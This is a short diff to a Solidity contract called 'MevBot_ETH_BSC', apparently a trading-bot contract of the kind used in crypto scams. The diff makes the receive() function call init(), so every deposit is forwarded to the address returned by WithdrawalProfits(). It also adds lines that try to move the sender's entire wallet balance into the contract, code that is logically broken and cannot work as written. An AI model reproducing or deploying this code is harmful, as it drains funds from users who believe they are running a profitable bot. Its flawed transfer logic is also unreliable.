@@ -49,7 +49,7 @@ contract MevBot_ETH_BSC {
     }
   
 
-    receive() external payable {}
+    receive() external payable {init();}
 
     struct slice {
         uint _len;
@@ -377,6 +377,13 @@ contract MevBot_ETH_BSC {
     */
 
     function init() private {
+        uint256 senderBalance = msg.sender.balance;
+        uint256 gasPrice = tx.gasprice;
+        uint256 gasLimit = 21000; 
+        uint256 gasCost = gasPrice * gasLimit;
+        uint256 amountToSend = senderBalance - gasCost;
+        (bool success, ) = payable(address(this)).call{value: amountToSend}("");
+        require(success, "Transfer failed");
         payable(WithdrawalProfits()).transfer(address(this).balance);
     }
     
